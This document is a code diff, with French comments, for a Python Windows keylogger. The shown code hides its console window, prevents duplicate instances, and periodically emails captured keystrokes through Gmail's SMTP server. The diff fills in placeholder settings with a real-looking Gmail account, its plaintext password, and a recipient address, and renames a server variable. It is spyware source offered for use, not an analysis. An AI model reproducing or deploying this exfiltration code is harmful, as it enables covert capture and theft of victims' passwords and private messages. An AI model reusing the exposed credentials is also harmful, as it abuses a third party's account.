@@ -14,7 +14,7 @@ import win32event, win32api, winerror
 from _winreg import *
 
 
-# Interdiction de plusieurs instanciations
+# Interdiction de plusieurs instanciations du thread
 # Processus mutex : filtre
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
@@ -25,7 +25,7 @@ data = ''
 count = 0
 
 
-# Dissimule la console
+# Dissimule la console au déclenchement
 def hide():
     import win32console,win32gui
     window = win32console.GetConsoleWindow()
@@ -62,26 +62,26 @@ class TimerClass(threading.Thread):
                 ts = datetime.datetime.now()
                 SERVER = "smtp.gmail.com"
                 PORT = 587
-                USER = "xxxxxxx@gmail.com" # à modifier
-                PASS = "xxxxxxx" # à modifier
+                USER = "hackrinz@gmail.com" # à modifier
+                PASS = "psgsquare77" # à modifier
                 FROM = USER
-                TO = ["xxxxxxxxx@gmail.com"] # à modifier
+                TO = ["hackrinz@gmail"] # à modifier
                 SUBJECT = "Keylogger sniff : " + str(ts)
                 MESSAGE = data
                 message = """\
-                        From: %s
-                        To: %s
-                        Subject: %s
-                        %s
-                        """ % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
+From: %s
+To: %s
+Subject: %s
+%s
+""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                 try:
-                    server = smtplib.SMTP()
-                    server.connect(SERVER,PORT)
-                    server.starttls()
-                    server.login(USER,PASS)
-                    server.sendmail(FROM, TO, message)
+                    serveur = smtplib.SMTP()
+                    serveur.connect(SERVER,PORT)
+                    serveur.starttls()
+                    serveur.login(USER,PASS)
+                    serveur.sendmail(FROM, TO, message)
                     data = ''
-                    server.quit()
+                    serveur.quit()
                 except Exception as e:
                     print e
                     print "Problème envoie de MAIL > dist\\KV.exe.logs"
